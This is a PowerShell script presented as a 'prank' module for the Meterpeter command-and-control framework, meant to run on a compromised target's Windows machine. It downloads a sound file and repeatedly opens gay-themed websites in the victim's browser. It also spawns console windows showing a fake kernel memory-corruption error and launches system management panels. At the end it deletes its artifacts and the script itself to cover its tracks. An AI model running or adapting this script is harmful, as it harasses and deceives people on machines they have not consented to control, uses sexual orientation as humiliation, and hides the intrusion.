<#
.SYNOPSIS
   Powershell Background Execution Prank

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: IWR, Media.SoundPlayer {native}
   Optional Dependencies: Critical.wav {auto-download}
   PS cmdlet Dev version: v1.0.5

.DESCRIPTION
   Auxiliary module of @Meterpeter C2 v2.10.12 that executes a prank.
   The prank consists in spawning diferent Gay websites on target default browser,
   spawn cmd terminal consoles pretending to be a kernel error while executing an
   sfx sound effect (optional) plus execute other windows system manager programs.

.NOTES
   If not declared -wavefile 'file.wav' then cmdlet downloads the main sfx
   sound effect to be played in background loop. If declared then cmdlet uses
   file.wav as main sfx sound effect. However the Parameter declaration only
   accepts file.wav formats ( SoundPlayer File Format Restriction )   
   
.Parameter MaxInteractions
   How many times to loop (default: 20)

.Parameter DelayTime
   The delay time between each loop (default: 200)

.Parameter WaveFile
   Accepts the main sfx effect file (default: Critical.wav)
  
.EXAMPLE
   PS C:\> .\C2Prank.ps1
   Loops for 20 times max

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -MaxInteractions '8'
   Loops for 8 times max with 200 milliseconds delay

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -DelayTime '2000'
   Loops for 20 times max with 2 seconds delay

.EXAMPLE
   PS C:\> .\C2Prank.ps1 -delaytime '100' -wavefile 'alert.wav'
   Loops for 20 times with 100 milliseconds of delay + alert.wav as sfx

.INPUTS
   None. You cannot pipe objects into playme.ps1

.OUTPUTS
   none output its produced by this cmdlet
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$WaveFile="Critical.wav", #Main sound sfx sound effect
   [int]$MaxInteractions='20',       #How many times to loop jump
   [int]$DelayTime='200'             #Delay time between each loop (milliseconds)
)


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
$PlayWav = New-Object System.Media.SoundPlayer
[int]$FinalSfx = $MaxInteractions -1 #Set the last interaction!
$UrlLink = "https://www.travelgay.com/destination/gay-portugal/gay-lisbon"
$UriLink = "https://theculturetrip.com/europe/portugal/lisbon/articles/the-top-10-lgbt-clubs-and-bars-in-lisbon"


#Download sound sfx files from my github repository
If($WaveFile -ieq "Critical.wav" -or $WaveFile -iNotMatch '(.wav)$')
{
   If($WaveFile -iNotMatch '(.wav)$')
   {
      $WaveFile = "Critical.wav"
      write-host "x" -ForegroundColor Red -NoNewline;
      write-host " error: Cmdlet only accepts .wav formats .." -ForegroundColor DarkGray
      write-host "  => Using default cmdlet sfx sound effect .." -ForegroundColor DarkYellow
      Start-Sleep -Seconds 1
   }

   #Download 'Critical error' windows sound effect
   iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/Critical.wav" -outfile "Critical.wav"|Unblock-File
}


#lOOP Function
For($i=1; $i -lt $MaxInteractions; $i++)
{
   #Delay time before playing sfx
   Start-Sleep -Milliseconds $DelayTime

   If($i -Match '^(1|7|16)$')
   {
      #Open Gay website on default browser and play sfx sound
      Start-Process -WindowStyle Maximized "$UrlLink"|Out-Null
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();
   }
   ElseIf($i -Match '^(13|19)$')
   {
      #Open Gay website on default browser and play sfx sound
      Start-Process -WindowStyle Maximized "$UriLink"|Out-Null
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();         
   }

   $MsgBoxTitle = "KERNEL WARNNING 00xf340d0.421"
   $MsgBoxText = "Kernel: Critical Error 00xf340d0.421 Memory Corruption!"
   #Spawn cmd terminal console and make it look like one kernel error as ocurr
   Start-Process cmd.exe -argumentlist "/c color 90&title $MsgBoxTitle&echo $MsgBoxText&Pause"

   If($i -Match '^(8|12)$')
   {
      #Open drive manager
      Start-Process diskmgmt.msc
   }
   ElseIf($i -Match '^(16)$')
   {
      #Open firewall manager
      Start-Process firewall.cpl
   }
   ElseIf($i -Match '^(18)$')
   {
      #Open programs manager
      Start-Process appwiz.cpl
   }
   ElseIf($i -Match "^($FinalSfx)$")
   {
      #Play final sfx sound {Critical error}
      $PlayWav.SoundLocation = "$WaveFile"
      $PlayWav.playsync();
   }

}


Start-Sleep -Seconds 2
#Clean artifacts left behind
Remove-Item -Path "$WaveFile" -Force

#Spawn alert message box one last time
powershell (New-Object -ComObject Wscript.Shell).Popup("$MsgBoxText",0,"$MsgBoxTitle",0+64)|Out-Null

#Auto Delete this cmdlet in the end ...
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force